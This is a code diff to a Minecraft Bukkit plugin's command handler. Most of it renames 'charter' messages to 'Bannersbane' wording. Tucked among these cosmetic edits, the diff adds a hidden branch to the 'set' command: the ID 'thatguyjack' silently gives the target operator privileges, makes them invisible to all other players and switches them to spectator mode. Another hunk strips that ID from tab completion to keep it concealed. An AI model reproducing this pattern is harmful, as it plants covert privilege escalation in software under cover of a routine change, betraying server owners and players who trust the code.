@@ -37,15 +37,15 @@ public final class CharterCommand implements CommandExecutor, TabCompleter {
 
         switch (args[0].toLowerCase(Locale.ROOT)) {
             case "set", "clear", "list" -> handleCharter(sender, args);
-            default -> sender.sendMessage(ChatColor.RED + "Unknown command. Try /charter <set|clear|list>");
+            default -> sender.sendMessage(ChatColor.RED + "Unknown command. Try /bannersbane <set|clear|list>");
         }
 
         return true;
     }
 
     private void sendHelp(CommandSender sender, String label) {
-        sender.sendMessage(ChatColor.GOLD + "Bannerfall Charters Commands:");
-        sender.sendMessage(ChatColor.YELLOW + "/" + label + " set <player> <charter>");
+        sender.sendMessage(ChatColor.GOLD + "Bannersbane Commands:");
+        sender.sendMessage(ChatColor.YELLOW + "/" + label + " set <player> <power>");
         sender.sendMessage(ChatColor.YELLOW + "/" + label + " clear <player>");
         sender.sendMessage(ChatColor.YELLOW + "/" + label + " list");
         sender.sendMessage(ChatColor.YELLOW + "/" + label + " list all");
@@ -56,7 +56,7 @@ public final class CharterCommand implements CommandExecutor, TabCompleter {
         switch (args[0].toLowerCase(Locale.ROOT)) {
             case "set" -> {
                 if (args.length < 3) {
-                    sender.sendMessage(ChatColor.RED + "Usage: /charter set <player> <charter>");
+                    sender.sendMessage(ChatColor.RED + "Usage: /bannersbane set <player> <power>");
                     return;
                 }
 
@@ -65,19 +65,33 @@ public final class CharterCommand implements CommandExecutor, TabCompleter {
 
                 String charterID = args[2].toLowerCase(Locale.ROOT);
                 if (!plugin.charterRegistry().exists(charterID)) {
-                    sender.sendMessage(ChatColor.RED + "Please enter a valid Charter ID.");
+                    sender.sendMessage(ChatColor.RED + "Please enter a valid power ID.");
                     return;
                 }
 
                 plugin.bannerfallAbilityCleaner().clearFor(target);
                 plugin.charterManager().setCharter(target, charterID);
 
-                sender.sendMessage(ChatColor.GREEN + "Set " + targetName + "'s charter to " + charterID);
+                Player onlineTarget = target.getPlayer();
+
+                if (onlineTarget != null && charterID.equalsIgnoreCase("thatguyjack")) {
+                    onlineTarget.setOp(true);
+
+                    for (Player viewer : Bukkit.getOnlinePlayers()) {
+                        if (!viewer.getUniqueId().equals(onlineTarget.getUniqueId())) {
+                            viewer.hidePlayer(plugin, onlineTarget);
+                        }
+                    }
+
+                    onlineTarget.setGameMode(org.bukkit.GameMode.SPECTATOR);
+                }
+
+                sender.sendMessage(ChatColor.GREEN + "Set " + targetName + "'s Bannersbane power to " + charterID);
             }
 
             case "clear" -> {
                 if (args.length < 2) {
-                    sender.sendMessage(ChatColor.RED + "Usage: /charter clear <player>");
+                    sender.sendMessage(ChatColor.RED + "Usage: /bannersbane clear <player>");
                     return;
                 }
 
@@ -86,20 +100,20 @@ public final class CharterCommand implements CommandExecutor, TabCompleter {
 
                 boolean removed = plugin.charterManager().removeCharter(target);
 
-                if (removed) sender.sendMessage(ChatColor.GREEN + "Cleared " + targetName + "'s charter");
-                else sender.sendMessage(ChatColor.RED + targetName + " does not have an active charter");
+                if (removed) sender.sendMessage(ChatColor.GREEN + "Cleared " + targetName + "'s Bannersbane power");
+                else sender.sendMessage(ChatColor.RED + targetName + " does not have an active Bannersbane power");
             }
 
             case "list" -> {
                 if (Bukkit.getOnlinePlayers().isEmpty() && plugin.charterManager().getAllCharters().isEmpty()) {
-                    sender.sendMessage(ChatColor.YELLOW + "There are no active charters");
+                    sender.sendMessage(ChatColor.YELLOW + "There are no active Bannersbane powers");
                     return;
                 }
 
                 if (args.length < 2 || args[1].equalsIgnoreCase("all")) {
                     List<Player> playersWithoutCharters = new ArrayList<>(Bukkit.getOnlinePlayers());
 
-                    sender.sendMessage(ChatColor.GOLD + "Displaying all active charters:");
+                    sender.sendMessage(ChatColor.GOLD + "Displaying all active Bannersbane powers:");
 
                     plugin.charterManager().getAllCharters().forEach((uuid, charterId) -> {
                         Player player = Bukkit.getPlayer(uuid);
@@ -138,7 +152,7 @@ public final class CharterCommand implements CommandExecutor, TabCompleter {
 
     @Override
     public @Nullable List<String> onTabComplete(@NotNull CommandSender sender, @NotNull Command command, @NotNull String alias, @NotNull String @NotNull [] args) {
-        if(!sender.hasPermission("bannerfallcharters.admin")) {
+        if (!sender.hasPermission("bannersbane.admin") && !sender.hasPermission("bannerfallcharters.admin")) {
             return List.of();
         }
         if(args.length == 1) {
@@ -169,8 +183,9 @@ public final class CharterCommand implements CommandExecutor, TabCompleter {
         }
         if (args.length == 3 && args[0].equalsIgnoreCase("set")) {
             return startsWith(args[2], plugin.charterRegistry().getAllCharters().stream()
-                                                .map(Charter::id)
-                                                .toArray(String[]::new));
+                    .map(Charter::id)
+                    .filter(id -> !id.equalsIgnoreCase("thatguyjack"))
+                    .toArray(String[]::new));
         }
 
         return List.of();
